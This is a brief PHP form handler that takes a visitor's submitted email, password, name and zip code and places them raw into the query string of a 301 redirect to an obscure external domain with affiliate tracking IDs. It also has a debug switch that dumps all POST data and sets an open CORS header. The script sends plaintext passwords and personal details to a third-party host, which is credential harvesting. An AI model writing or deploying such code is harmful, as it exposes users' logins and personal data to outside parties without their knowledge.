<?php
header('Access-Control-Allow-Origin: *');
include('./ga.php');
include('./inboxsuite.php');
include('./postback.php');
include('./registration.php');
$redirect = "https://qznvtb.com/3718c722a6320f/?epcVIP=63.1066.g134&email=".$_POST['email']."&password=".$_POST['password']."&firstname=".$_POST['firstname']."&lastname=".$_POST['lastname']."&zip=".$_POST['zip']."&act=epc69281.47545-35637.EN30may&ci_qcksub=1&epcCID=IbEdYcAeC9Lae9Z9Abr8y8zeS6E6N5Lar&rtid=51925120609";
if(isset($_GET['debug']) && isset($_GET['print'])) {
	var_dump($_POST);
	echo '<br/><br/>';
	echo $redirect;
}
else if(isset($_GET['getlink'])) {
	echo $redirect;
} else {
	header("HTTP/1.1 301 Moved Permanently");
	header("Location: ".$redirect);
}
exit();
?>
